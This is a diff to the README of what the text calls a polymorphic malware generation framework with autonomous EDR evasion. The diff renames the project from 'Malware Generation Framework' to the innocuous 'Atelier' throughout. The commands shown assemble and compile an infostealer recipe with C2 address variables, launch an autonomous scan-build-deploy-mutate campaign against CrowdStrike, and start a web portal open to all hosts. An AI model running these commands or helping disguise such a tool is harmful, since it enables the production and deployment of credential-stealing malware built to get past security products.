@@ -1,4 +1,4 @@
-# Malware Generation Framework
+# Atelier
 
 Deterministic, chunk-assembled polymorphic malware generation with autonomous EDR evasion. Produces unique, evasion-hardened binaries from declarative YAML recipes — validated against CrowdStrike Falcon and Windows Defender on live Windows 11 VMs.
 
@@ -15,13 +15,13 @@ python3 templates/chunks/assembler.py templates/chunks/recipes/infostealer_full.
     --var C2_IP=10.0.2.2 --var C2_PORT=9001
 
 # CLI wrapper
-python -m malware_gen_framework chunk --recipe infostealer_full --compile --randomize --obfuscate light
+python -m atelier chunk --recipe infostealer_full --compile --randomize --obfuscate light
 
 # Hermes autonomous campaign (scan → build → deploy → detect → mutate → retry)
 python -m hermes --edr crowdstrike --malware-type infostealer
 
 # Web portal
-python -m malware_gen_framework portal --port 7070 --host 0.0.0.0
+python -m atelier portal --port 7070 --host 0.0.0.0
 ```
 
 ### Prerequisites
@@ -284,7 +284,7 @@ results/chunk_infostealer_20260715_221129/
 
 ```bash
 # Assemble from recipe
-python -m malware_gen_framework chunk --recipe <name> --compile [options]
+python -m atelier chunk --recipe <name> --compile [options]
 
 Options:
   --randomize           Swap chunks via variant groups (forced for EDR targets)
@@ -296,7 +296,7 @@ Options:
 python -m hermes --edr crowdstrike --malware-type infostealer
 
 # Web portal
-python -m malware_gen_framework portal --port 7070 --host 0.0.0.0
+python -m atelier portal --port 7070 --host 0.0.0.0
 ```
 
 ---
